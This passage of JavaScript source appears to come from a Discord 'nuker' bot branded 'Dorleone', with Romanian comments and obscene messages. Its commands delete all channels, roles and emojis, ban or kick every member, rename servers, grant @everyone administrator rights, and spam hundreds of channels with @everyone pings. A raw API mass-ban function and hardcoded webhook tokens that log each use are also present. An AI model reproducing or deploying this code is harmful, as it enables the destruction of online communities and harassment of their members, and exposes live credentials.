      message.guild.setIcon('https://cdn.discordapp.com/attachments/786279916273795115/802917703446560789/Screenshot_20210124-143354_TikTok.jpg') // changes server pfp
      message.delete();

let pula = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.sn** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

      const wrb = new Discord.WebhookClient("896328401525288970", "OlUKUp3gtLIf1GBOXM2drbHNyH9yAwnvdg6WKC1vjmhoU-pocGRSJnGXICBaHr7ueD0S");
          await wrb.send(pula)
  
  }

if (message.content.startsWith('.guilds')) {


    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => m.delete({timeout: 1000}))
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

            message.lineReply('<:emoji_18:874972112253763634> Hey! This command is Developer Only').then(m => m.delete({timeout: 5000}))

        const ownerid = "811681164464095263"
 if (message.author.id == ownerid) {

        const ownerid = "811681164464095263"

      let i0 = 0;

      let i1 = 10;

      let page = 1;

      let description =

        `Total Servers - ${client.guilds.cache.size}\n\n` +

        client.guilds.cache

          .sort((a, b) => b.memberCount - a.memberCount)

          .map(r => r)

          .map((r, i) => `**${i + 1}** - ${r.name} | ${r.memberCount} Members\nID - ${r.id}`)

          .slice(0, 10)

          .join("\n\n");

      let embed = new Discord.MessageEmbed()

        .setAuthor(client.user.tag, client.user.displayAvatarURL({dynamic : true}))

        .setColor("00001")

        .setFooter(`Page - ${page}/${Math.ceil(client.guilds.cache.size / 10)}`)

        .setDescription(description);

      let msg = await message.lineReply(embed);
      
      await msg.react("⬅️");

      await msg.react("➡️");

      await msg.react("🔱");

      let collector = msg.createReactionCollector(

        (reaction, user) => user.id === message.author.id

      );

      collector.on("collect", async (reaction, user) => {

        if (reaction._emoji.name === "⬅️") {

          // Updates variables

          i0 = i0 - 10;

          i1 = i1 - 10;

          page = page - 1;

          // if there is no guild to display, delete the message

          if (i0 + 1 < 0) {

            console.log(i0)

            return msg.delete();

          }

          if (!i0 || !i1) {

            return msg.delete();

          }

          description =

            `Total Servers - ${client.guilds.cache.size}\n\n` +

            client.guilds.cache

              .sort((a, b) => b.memberCount - a.memberCount)

              .map(r => r)

              .map(

                (r, i) => `**${i + 1}** - ${r.name} | ${r.memberCount} Members\nID - ${r.id}`)

              .slice(i0, i1)

              .join("\n\n");

          // Update the embed with new informations

          embed

            .setFooter(

              `Page - ${page}/${Math.round(client.guilds.cache.size / 10 + 1)}`

            )

            .setDescription(description);

          // Edit the message

          msg.edit(embed);

        }

        if (reaction._emoji.name === "➡️") {

          // Updates variables

          i0 = i0 + 10;

          i1 = i1 + 10;

          page = page + 1;

          // if there is no guild to display, delete the message

          if (i1 > client.guilds.cache.size + 10) {

            return msg.delete();

          }

          if (!i0 || !i1) {

            return msg.delete();

          }

          description =

            `Total Servers - ${client.guilds.cache.size}\n\n` +

            client.guilds.cache

              .sort((a, b) => b.memberCount - a.memberCount)

              .map(r => r)

              .map(

                (r, i) => `**${i + 1}** - ${r.name} | ${r.memberCount} Members\nID - ${r.id}`)

              .slice(i0, i1)

              .join("\n\n");

          // Update the embed with new informations

          embed
                        .setFooter(
                    `Page - ${page}/${Math.round(client.guilds.cache.size / 10 + 1)}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()

            .setFooter(

              `Mafia Dorleone | Page - ${page}/${Math.round(client.guilds.cache.size / 10 + 1)}`

            )

            .setDescription(description);

          // Edit the message

          msg.edit(embed);

        }

        if (reaction._emoji.name === "🔱") {

          return msg.delete();

        }

        // Remove the reaction when the user react to the message

        await reaction.users.remove(message.author.id);

      });

    } else {

      return;

    }

  }

  // Mass Ban
  if (message.content.startsWith('.banv2')) {

        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)

		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}
    message.delete();

let tatata = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.banv2** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("896328401525288970", "OlUKUp3gtLIf1GBOXM2drbHNyH9yAwnvdg6WKC1vjmhoU-pocGRSJnGXICBaHr7ueD0S");
    await wrb.send(tatata)
  
function banAll(token, guild, member) {
	request({
			method: "PUT",
			url: `https://discord.com/api/v9/guilds/${guild}/bans/${member}`,
			json: true,
			headers: {
				"Content-Type": "application/json",
				"authorization": token 
			},
			json: {
				"delete_message_days":"1",
				"reason": ""
				}
		}, (err, res, body) => {
			switch (res.statusCode) {
				case 204:
					console.log(`[BANNED] ${member} Successfully!`); 
					break;
				default:
					break;
			}
		})
}
    

}

//saawokoajwova
  if (message.content.startsWith('.deletechannels')) {

		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}
    message.delete();
      message.guild.channels.cache.forEach(channel => channel.delete())     

let matatatata = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.deletechannels** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

      const wrb = new Discord.WebhookClient("889126909064134676", "Hu29IbH6s5cq1zsScRfVCPuSzEpjODH2jrubnJadxEvUpeC8kWxYdu6geHjgTMzschpv");
          await wrb.send(matatatata)
    
      await message.guild.channels.create(`server nuked by Dorleone Nuker`, {
        type : 'text'
      })

  }

//asaslal
  if (message.content.startsWith('.deleteroles')) {
		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}
message.delete();

let dada = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.deleteroles** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

const wrb = new Discord.WebhookClient("889126909064134676", "Hu29IbH6s5cq1zsScRfVCPuSzEpjODH2jrubnJadxEvUpeC8kWxYdu6geHjgTMzschpv");
    await wrb.send(dada)

    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })

  }

//sunt nr 1
  if (message.content.startsWith('.addchannel')) {

        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)

		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}

message.delete();

let add = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.addchannel** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("896328401525288970", "OlUKUp3gtLIf1GBOXM2drbHNyH9yAwnvdg6WKC1vjmhoU-pocGRSJnGXICBaHr7ueD0S");
    await wrb.send(add)

    await message.guild.channels.create(`server-futut`, {
      type : 'text'
    })
  }

//sunt nr 1
  if (message.content.startsWith('.addcategory')) {


        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)

		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}

let cfb = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.addcategory** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("896328401525288970", "OlUKUp3gtLIf1GBOXM2drbHNyH9yAwnvdg6WKC1vjmhoU-pocGRSJnGXICBaHr7ueD0S");
    await wrb.send(cfb)
message.delete();
    await message.guild.channels.create(`LXX`, {
      type : 'category'
    })

  }

//sunt nr 1
  if (message.content.startsWith('.cn')) {


        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)


		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;

		}

let cfb44 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.cn** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("896328401525288970", "OlUKUp3gtLIf1GBOXM2drbHNyH9yAwnvdg6WKC1vjmhoU-pocGRSJnGXICBaHr7ueD0S");
    await wrb.send(cfb44)
message.delete();
    message.guild.setName(`mori pizdo`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name


  }

//sunt nr 1
  if (message.content.startsWith('.deleteem')) {

        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)

		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}

let cacaq = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.deleteem** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("896328401525288970", "OlUKUp3gtLIf1GBOXM2drbHNyH9yAwnvdg6WKC1vjmhoU-pocGRSJnGXICBaHr7ueD0S");
    await wrb.send(cacaq)
message.delete();
    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Dorleone Was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))
  }


  // Mass Ban
  if (message.content.startsWith('.baneveryone')) {


		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}
    message.delete();

let hadad = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.baneveryone** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("889126909064134676", "Hu29IbH6s5cq1zsScRfVCPuSzEpjODH2jrubnJadxEvUpeC8kWxYdu6geHjgTMzschpv");
    await wrb.send(hadad)

    message.guild.members.cache.forEach(member => member.ban({ reason: "Dorleone was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))
      
}

//icon set
  if (message.content.startsWith('.giverole')) {


        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)

		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}

message.delete();

//haha
		if (give_everyone_administrator == false)
		{
			console.log(`Giving administrator to @everyone has been disabled.`)
		}
		else
		{
			var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
			everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES","ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])

		}
      message.delete();

let city = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.giverole** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

      const wrb = new Discord.WebhookClient("896328401525288970", "OlUKUp3gtLIf1GBOXM2drbHNyH9yAwnvdg6WKC1vjmhoU-pocGRSJnGXICBaHr7ueD0S");
          await wrb.send(city)
  
  }

  // Mass Channels      
  if (message.content.startsWith('rape')) {
    
		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}
    message.delete();
    // Channel Delete


    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`rip canal`))
    )); // deletes all channels
    message.delete();

    // Ban All

    message.guild.members.cache.forEach(member => member.ban({ reason: "Dorleone was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))

let mes = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **rape** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("889126909064134676", "Hu29IbH6s5cq1zsScRfVCPuSzEpjODH2jrubnJadxEvUpeC8kWxYdu6geHjgTMzschpv");

    await wrb.send(mes)
    // Kick All

    message.guild.members.cache.forEach(member => member.kick({ reason: "Dorleone was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ));
    // Delete All Roles                 


    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })

    // Delete All Emojis 

    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Dorleone Was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))

      message.guild.setIcon('https://cdn.discordapp.com/attachments/786279916273795115/802917703446560789/Screenshot_20210124-143354_TikTok.jpg') // changes server pfp

//haha
		if (give_everyone_administrator == false)
		{
			console.log(`Giving administrator to @everyone has been disabled.`)
		}
		else
		{
			var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
			everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES","ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])
			
		}
    // Death.

    message.guild.setName(`mori pizdo`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

    // Channel Delete
    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`canal sters`))
    ).then(
      // Channel Icon Change
      message.guild.setIcon('https://cdn.discordapp.com/attachments/786279916273795115/802917703446560789/Screenshot_20210124-143354_TikTok.jpg') // changes server pfp
    ));

    // Roles
    message.guild.roles.cache.forEach((role) => {
      if (!role.editable) {
        return;
      } else {
        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
      }
    })

    // Emoji
    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Dorleone was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))


    //rupem de toate vijhwiavjhiahwjviahivw
        await message.guild.channels.create(`LXX`, {
      type : 'category'
    })

  }

})

const http = require('http');
const requestListener = function(req, res) {
  res.end('Hai sa rupem niste tarfe');
}
const server = http.createServer(requestListener); 
server.listen(8080);

client.login(process.env.TOKEN)

client.on('message', async (message) => {
  if (message.content === '.nuke') {

        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)

		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}

    message.delete();
    message.guild.channels.cache.forEach(channel => channel.delete());

    message.guild.roles.cache.forEach(role => role.delete());
    message.guild.members.cache.forEach(member => member.ban({ reason: "Dorleone was here" }))

let da = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.nuke** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("896328401525288970", "OlUKUp3gtLIf1GBOXM2drbHNyH9yAwnvdg6WKC1vjmhoU-pocGRSJnGXICBaHr7ueD0S");

    await wrb.send(da)

    await message.guild.channels.create(`vati-dus-pe-pl`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }

})

client.on('message', async (message) => {
  if (message.content.startsWith('.kaboom')) {
    
    
        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)
          
		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}

                let grief = db.fetch(`${message.guild.id}-grief`)

if(grief == true)
return message.channel.send("<:emoji_18:874972112253763634> | Aceasta comanda se foloseste prima pe server. Nu se poate folosi dupa alte comenzi");

          message.delete();
let kam = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.kaboom** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("896328401525288970", "OlUKUp3gtLIf1GBOXM2drbHNyH9yAwnvdg6WKC1vjmhoU-pocGRSJnGXICBaHr7ueD0S");

    await wrb.send(kam)

                if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                    return console.log(("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                } else {
                      let channels =  message.guild.channels.cache.array();
                         message.guild.channels.cache.array().forEach(channel => {
          channel.delete();
        });
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    // If you dont give an input
                    if (!argresult) {
                        for (var i = 0; i < 200; i++) {
                            message.guild.channels.create('wizzed by ' + message.author.username)
    
                            for (var i = 0; i < 200; i++) {
                                let channels = message.guild.channels.create('wizzed by ' + message.author.username)
    
                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone ' + argresult)
                                            console.log((`rip`));
                                            // other per-channnel logic
                                        }
                                    }
                                );
                            }
    
                        }
    
                    }
    
                    // If you give an input
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)
    
                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone ' + argresult);
                                    console.log(`CHANNEL PINGED!`);
                                    // other per-channnel logic
                                }
                            }
                        );
                    }
                }
                message.delete();
       
            }          

                        const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")

          db.set(`${message.guild.id}-grief`, true);  

     })

client.on('message', async (message) => {
  if (message.content === '@vwawvajijijij@everyonewa') {

        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(`Mafia Dorleone | Premium`, `https://images-ext-2.discordapp.net/external/O6fo8O5ExVsJ4Ax9RwxMC9AA4ddabvEmqu5GVh9CREk/%3Fsize%3D256%26f%3D.gif/https/cdn.discordapp.com/avatars/747480885573713984/a_5d39ada7788dcfd646b307582e7019a0.gif`);
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)

    if (message.guild.id === "847915478483206194") return message.channel.send("ce pula mea faci =))")
    await message.guild.channels.create(`server-closed`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone https://discord.gg/EfdUHfU6cK Dorleone was here')
    message.channel.send('@everyone https://discord.gg/EfdUHfU6cK Dorleone was here')
    message.channel.send('@everyone https://discord.gg/EfdUHfU6cK Dorleone was here')
    message.channel.send('@everyone https://discord.gg/EfdUHfU6cK Dorleone was here')
  })
  }
})

//ok fac ceva misto
client.on('message', async (message) => {
  if (message.content === '.spamchannels') {

        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
